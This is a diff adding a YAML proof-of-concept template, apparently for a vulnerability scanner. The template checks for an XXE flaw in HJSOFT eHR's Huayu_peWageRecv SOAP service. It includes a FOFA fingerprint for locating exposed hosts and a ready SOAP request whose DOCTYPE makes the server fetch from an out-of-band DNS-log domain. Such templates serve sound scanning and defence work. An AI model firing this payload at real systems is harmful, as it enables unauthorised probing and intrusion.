@@ -1,0 +1,26 @@
+id: poc-yaml-hjsoft-ehr-huayu-pewagerecv-xxe
+info:
+  name: 宏景eHR Huayu_peWageRecv XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /services/HrpService
+  headers:
+    SOAPAction: ''
+    Content-Type: text/xml;charset=UTF-8
+  data: "<!DOCTYPE syscode SYSTEM \"http://{{.domain}}/Huayu_peWageRecv\">\n<soapenv:Envelope\
+    \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:hrp=\"http://www.hjsj.com/HrpService\"\
+    >\n   <soapenv:Header/>\n   <soapenv:Body>\n      <hrp:Huayu_peWageRecv>\n   \
+    \      <hrp:in0><syscode>&send;</syscode></hrp:in0>\n      </hrp:Huayu_peWageRecv>\n\
+    \   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 500 && contains(body,"java.io.IOException") && contains(body,"Huayu_peWageRecv")
+    && contains(content_type,"text/xml") && reverse.Verify()
+transport: http
